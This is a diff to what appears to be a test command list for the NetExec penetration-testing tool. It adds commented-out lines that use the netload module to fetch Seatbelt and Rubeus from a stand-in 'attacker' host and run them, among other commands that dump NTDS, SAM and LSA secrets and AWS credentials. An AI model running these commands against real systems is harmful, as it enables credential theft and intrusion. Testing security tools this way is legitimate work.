@@ -270,6 +270,10 @@ netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --check-p
 netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M ntds-dump-raw
 netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M ntds-dump-raw -o TARGET=SAM,LSA,NTDS
 netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M aws-credentials
+# netload requires a .NET assembly URL or local path, and drops a binary to disk -- run manually, not in CI
+#netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M netload -o URL=http://attacker/Seatbelt.exe ARGS="-group=all"
+#netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M netload -o URL=http://attacker/Rubeus.exe ARGS="kerberoast /nowrap"
+#netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M netload -o CLEANUP=True
 ##### MSSQL
 netexec mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS # Need a space at the end for kerb regex
 netexec {DNS} mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS # Need a space at the end for kerb regex
